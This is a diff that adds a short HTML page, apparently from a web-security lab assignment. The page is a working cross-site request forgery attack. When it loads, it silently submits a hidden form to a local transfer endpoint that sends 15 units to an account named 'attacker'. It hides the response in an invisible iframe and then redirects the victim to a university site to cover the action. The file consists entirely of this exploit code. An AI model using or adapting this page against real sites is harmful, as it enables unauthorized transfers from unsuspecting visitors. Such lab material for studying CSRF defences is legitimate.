@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+
+<head>
+    <meta charset="utf-8">
+    <title>Transfer</title>
+</head>
+
+<body onload="transfer()">
+    <form id="transfer" action="http://localhost:3000/post_transfer" target="redirect" method="post">
+        <input type="hidden" name="destination_username" value="attacker">
+        <input type="hidden" name="quantity" value="15">
+    </form>
+    <iframe name="redirect" style="width: 0; height: 0; border: none;" onload="redirect()"></iframe>
+
+    <script>
+        var flag = false;
+        function transfer() {
+            document.getElementById("transfer").submit();
+            flag = true;
+        }
+        function redirect() {
+            if(flag) window.location.replace("https://cs.ustc.edu.cn/");
+        }
+    </script>
+</body>
